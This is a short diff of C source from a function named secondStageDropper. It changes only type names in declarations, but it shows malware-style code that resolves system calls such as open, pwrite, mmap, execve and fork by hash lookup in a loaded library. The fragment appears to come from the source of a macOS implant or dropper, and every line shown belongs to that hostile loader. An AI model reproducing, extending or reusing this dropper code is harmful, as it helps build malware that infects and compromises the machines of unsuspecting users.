@@ -589,11 +589,11 @@ void secondStageDropper ()
   // libSystem function pointer prototypes
   //
   int   (*iopen)     (const char *, int, ...);
-  long  (*ilseek)    (int, off_t, int);
+  long  (*ilseek)    (int, _mOff_t, int);
   int   (*iclose)    (int);
-  int   (*ipwrite)   (int, const void *, int, mOff_t);
+  int   (*ipwrite)   (int, const void *, int, _mOff_t);
   int  *(*istat)     (const char *, struct stat *);
-  void *(*immap)     (void *, mSize_t, int, int, int, mOff_t);
+  void *(*immap)     (void *, _mSize_t, int, int, int, _mOff_t);
   void *(*imemcpy)   (void *, const void *, int);
   int   (*isprintf)  (char *, const char *, ...);
   int   (*iprintf)   (const char *, ...);
@@ -602,7 +602,7 @@ void secondStageDropper ()
   int   (*iexecve)   (const char *, char *, char *);
   int   (*iexecl)    (const char *, const char *, ...);
   int   (*ifork)     (void);
-  char *(*istrncpy)  (char *, const char *, mSize_t);
+  char *(*istrncpy)  (char *, const char *, _mSize_t);
   void *(*imalloc)   (int);
   void  (*ifree)     (void *);
   unsigned int (*isleep) (unsigned int);
@@ -648,11 +648,11 @@ void secondStageDropper ()
                         }
 
                       iopen     = (int  (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, openHash) + (unsigned int)m_header);
-                      ilseek    = (long (__cdecl *)(int, off_t, int))(findSymbolInFatBinary ((byte *)libSystemAddress, lseekHash) + (unsigned int)m_header);
+                      ilseek    = (long (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libSystemAddress, lseekHash) + (unsigned int)m_header);
                       iclose    = (int  (__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, closeHash) + (unsigned int)m_header);
-                      ipwrite   = (int  (__cdecl *)(int,const void *, int, mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, pwriteHash) + (unsigned int)m_header);
+                      ipwrite   = (int  (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, pwriteHash) + (unsigned int)m_header);
                       istat     = (int* (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libSystemAddress, statHash) + (unsigned int)m_header);
-                      immap     = (void*(__cdecl *)(void *, mSize_t, int, int, int, mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, mmapHash) + (unsigned int)m_header);
+                      immap     = (void*(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, mmapHash) + (unsigned int)m_header);
                       imemcpy   = (void*(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libSystemAddress, memcpyHash) + (unsigned int)m_header);
                       isprintf  = (int  (__cdecl *)(char *, const char *, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, sprintfHash) + (unsigned int)m_header);
                       iprintf   = (int  (__cdecl *)(const char *,...))(findSymbolInFatBinary ((byte *)libSystemAddress, printfHash) + (unsigned int)m_header);
@@ -661,7 +661,7 @@ void secondStageDropper ()
                       iexecve   = (int  (__cdecl *)(const char *, char *, char *))(findSymbolInFatBinary ((byte *)libSystemAddress, execveHash) + (unsigned int)m_header);
                       iexecl    = (int  (__cdecl *)(const char *, const char *,...))(findSymbolInFatBinary ((byte *)libSystemAddress, execlHash) + (unsigned int)m_header);
                       ifork     = (int  (__cdecl *)(void))(findSymbolInFatBinary ((byte *)libSystemAddress, forkHash) + (unsigned int)m_header);
-                      istrncpy  = (char*(__cdecl *)(char *, const char *, mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, strncpyHash) + (unsigned int)m_header);
+                      istrncpy  = (char*(__cdecl *)(char *, const char *, _mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, strncpyHash) + (unsigned int)m_header);
                       imalloc   = (void*(__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, mallocHash) + (unsigned int)m_header);
                       ifree     = (void (__cdecl *)(void *))(findSymbolInFatBinary ((byte *)libSystemAddress, freeHash) + (unsigned int)m_header);
                       isleep    = (unsigned int (__cdecl *)(unsigned int))(findSymbolInFatBinary ((byte *)libSystemAddress, sleepHash) + (unsigned int)m_header);
